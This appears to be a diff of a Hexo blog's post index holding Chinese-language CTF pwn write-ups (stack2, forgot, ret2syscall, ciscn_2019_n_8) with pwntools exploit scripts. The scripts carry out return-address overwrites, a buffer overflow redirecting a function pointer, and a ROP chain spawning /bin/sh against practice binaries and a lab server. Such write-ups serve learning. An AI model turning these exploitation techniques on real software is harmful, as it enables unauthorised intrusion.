@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>ciscn_2019_n_8</title>
+      <link href="/2022/01/17/ciscn-2019-n-8/"/>
+      <url>/2022/01/17/ciscn-2019-n-8/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/17/ciscn-2019-n-8/checksec.png" alt="image-20220117113118808" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/17/ciscn-2019-n-8/run1.png" alt="image-20220117113234511" style="zoom:80%;"><img src="/2022/01/17/ciscn-2019-n-8/run2.png" alt="image-20220117113442418" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><ul><li><p>发现函数</p><p><img src="/2022/01/17/ciscn-2019-n-8/system.png" alt="image-20220117113759246"></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2022/01/16/welpwn/"/>
+      <url>/2022/01/16/welpwn/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>warmup</title>
       <link href="/2022/01/15/fuzz/"/>
       <url>/2022/01/15/fuzz/</url>
@@ -37,7 +75,7 @@
       <link href="/2022/01/15/stack2/"/>
       <url>/2022/01/15/stack2/</url>
       
-        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/15/stack2/checksec.png" alt="image-20220115142055209" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/15/stack2/run.png" alt="image-20220115142227040" style="zoom:80%;"><h3 id="ida-程序分析"><a href="#ida-程序分析" class="headerlink" title="ida+程序分析"></a>ida+程序分析</h3><p>(ps:计算数组首地址距离retn的偏移时异常痛苦)</p><h3 id><a href="#" class="headerlink" title></a><img src="/2022/01/15/stack2/array.png" alt="image-20220115212659649" style="zoom:80%;"></h3><img src="/2022/01/15/stack2/addr.png" alt="image-20220115212936878" style="zoom:80%;"><p>​                                                         <img src="/2022/01/15/stack2/ret.png" alt="image-20220115213107027" style="zoom:80%;"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'elf = ELF("./stack2")local = 0if local:    r = process("./stack2")else:    r = remote("111.200.241.244",60371)sh_addr = 0x08048987#sh_addr = 0x08048ab3system_plt = 0x08048450offset = 0x84r.sendlineafter("you have:\n","1")r.sendlineafter("numbers\n","1")def sendpayload(addr,i):    r.sendlineafter("exit\n","3")    r.sendlineafter("change:\n",str(addr))    r.sendlineafter("number:\n",str(i))#发送system地址sendpayload(offset,0x50)sendpayload(offset+1,0x84)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)offset += 8sendpayload(offset,0x87)sendpayload(offset+1,0x89)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)    r.sendlineafter("exit\n","5")r.interactive()#0x080488F2 ret#0x080486D5 eax#0xffffd18c ret_esp#0xffffd108 eax_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/15/stack2/checksec.png" alt="image-20220115142055209" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/15/stack2/run.png" alt="image-20220115142227040" style="zoom:80%;"><h3 id="ida-程序分析"><a href="#ida-程序分析" class="headerlink" title="ida+程序分析"></a>ida+程序分析</h3><p>(ps:计算数组首地址距离retn的偏移时异常痛苦)</p><ul><li>此题的关键点也是难点便是找到数组首地址和返回地址之间的偏移.直接从ida看到的偏移并不正确,需要在gdb中手动调试.</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2022/01/15/stack2/array.png" alt="image-20220115212659649" style="zoom:80%;"></h3><ul><li>此处可以看到通过eax和ecx,将v7的数据给v13,此时eax的值便是数组v13的首地址.</li></ul><img src="/2022/01/15/stack2/addr.png" alt="image-20220115212936878" style="zoom:80%;"><ul><li>在retn处下断点,esp处的值便是返回地址.</li></ul><p>​                        <img src="/2022/01/15/stack2/ret.png" alt="image-20220115213107027" style="zoom:80%;"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'elf = ELF("./stack2")local = 0if local:    r = process("./stack2")else:    r = remote("111.200.241.244",60371)sh_addr = 0x08048987#sh_addr = 0x08048ab3system_plt = 0x08048450offset = 0x84r.sendlineafter("you have:\n","1")r.sendlineafter("numbers\n","1")def sendpayload(addr,i):    r.sendlineafter("exit\n","3")    r.sendlineafter("change:\n",str(addr))    r.sendlineafter("number:\n",str(i))#发送system地址sendpayload(offset,0x50)sendpayload(offset+1,0x84)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)offset += 8sendpayload(offset,0x87)sendpayload(offset+1,0x89)sendpayload(offset+2,0x04)sendpayload(offset+3,0x08)    r.sendlineafter("exit\n","5")r.interactive()#0x080488F2 ret#0x080486D5 eax#0xffffd18c ret_esp#0xffffd108 eax_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
       
       
       <categories>
@@ -170,7 +208,7 @@
       <link href="/2022/01/13/forgot/"/>
       <url>/2022/01/13/forgot/</url>
       
-        <content type="html"><![CDATA[<ul><li><p>checksec</p><img src="/2022/01/13/forgot/checksec.png" alt="image-20220113132119292" style="zoom:80%;"></li><li><p>ida</p></li></ul><p>​                                       <img src="/2022/01/13/forgot/flag.png" alt="image-20220113162931499" style="zoom:80%;"></p><p>​                                                                         cat  flag函数</p><ul><li><p>运行</p><img src="/2022/01/13/forgot/run.png" alt="image-20220113163122226" style="zoom:67%;"></li><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./forgot")local = 0if local:    r = process("./forgot")else:    r = remote("111.200.241.244",55953)flag_addr = 0x080486CCpayload = b'A'*(0x74-0x54) + p64(flag_addr)r.sendlineafter("&gt; ","NAME")r.sendlineafter("&gt; ",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+        <content type="html"><![CDATA[<ul><li><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/13/forgot/checksec.png" alt="image-20220113132119292" style="zoom:80%;"></li><li><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3></li></ul><p>​                                       <img src="/2022/01/13/forgot/flag.png" alt="image-20220113162931499" style="zoom:80%;"></p><p>​          <strong>cat  flag函数</strong> 最后调用此函数</p><p>​                                     <img src="/2022/01/13/forgot/fgets.png" alt="image-20220117123525818" style="zoom:80%;"></p><ul><li><p>fgets函数有输入字符限制,没办法溢出,第二处的scanf是经典的栈溢出</p></li><li><p><img src="/2022/01/13/forgot/v.png" alt="image-20220117124040209"></p></li></ul><p>​      v3<del>v12均为函数地址,v14算是下标,所以只要覆盖掉v3</del>v12中的任意一处,覆盖为cat flag 函数的地址.这里选择v3</p><ul><li><img src="/2022/01/13/forgot/v14.png" alt="image-20220117124328690" style="zoom:80%;">- 我们想让程序执行v3处的函数(被我们覆盖后的函数),就必须让v14=1(这样--v14的值便为0,所以就会执行v13处的函数),由于v14本来等于1,所以只要在for循环中不给它其他值的机会,所以让所有if的条件为假.- 合法输入为:a~z 0~9 _-+.- <img src="/2022/01/13/forgot/if.png" alt="image-20220117124908410" style="zoom:80%;"></li></ul><ul><li><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/13/forgot/run.png" alt="image-20220113163122226" style="zoom:67%;"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./forgot")local = 0if local:    r = process("./forgot")else:    r = remote("111.200.241.244",55953)flag_addr = 0x080486CCpayload = b'A'*(0x74-0x54) + p64(flag_addr)r.sendlineafter("&gt; ","NAME")r.sendlineafter("&gt; ",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
       
       
       <categories>
@@ -324,7 +362,7 @@
       <link href="/2022/01/11/ret2syscall/"/>
       <url>/2022/01/11/ret2syscall/</url>
       
-        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><p>运行程序</p><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><p>拖入IDA</p><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p> 发现危险函数gets()</p><p>​        找gadgets</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><p>​                bin/sh地址</p><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><p>​            int 0x80地址</p><p>​                                   <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></p><p>​              </p><p>​          </p><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
+        <content type="html"><![CDATA[<ul><li><p>首先checksec一下</p><img src="/2022/01/11/ret2syscall/ret2syscall.png" alt="image-20220111142017568" style="zoom:80%;"></li><li><p>运行程序</p><img src="/2022/01/11/ret2syscall/run.png" alt="image-20220111142216384" style="zoom:80%;"></li><li><p>拖入IDA</p><img src="/2022/01/11/ret2syscall/unsafe.png" alt="image-20220111143431233" style="zoom:80%;"><p> 发现危险函数gets(),明显的栈溢出.</p><p>​        找gadgets,使用ROPgadget进行寻找</p><p>​        eax</p><img src="/2022/01/11/ret2syscall/eax.png" alt="image-20220111144133374" style="zoom:80%;"></li></ul><p>​              ebx</p><p>​                                       <img src="/2022/01/11/ret2syscall/ebx.png" alt="image-20220111144234974" style="zoom:80%;"></p><p>​                bin/sh地址</p><p>​                                    <img src="/2022/01/11/ret2syscall/bin_sh.png" alt="image-20220111144933401" style="zoom:80%;"></p><p>​            int 0x80地址</p><p>​                                   <img src="/2022/01/11/ret2syscall/int.png" alt="image-20220111145124389" style="zoom:80%;"></p><p>​              </p><p>​          </p><ul><li><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                                       log_level = 'debug'elf = ELF("./ret2syscall")local = 1if local:    r = process("./ret2syscall")else:    r = remote("") eax_addr = 0x080bb196ebx_addr = 0x0806eb90int_addr = 0x08049421bin_sh = 0x080be408payload = flat(['A'*112,eax_addr,0xb,ebx_addr,0,0,bin_sh,int_addr])r.sendline(payload)r.interactive()  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
       
       
       <categories>
@@ -416,19 +454,6 @@
             <tag> 二进制 </tag>
             
         </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2021/11/30/hello-world/"/>
-      <url>/2021/11/30/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p><img src="/2021/11/30/hello-world/1.png" alt="hello"></p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
       
     </entry>
     
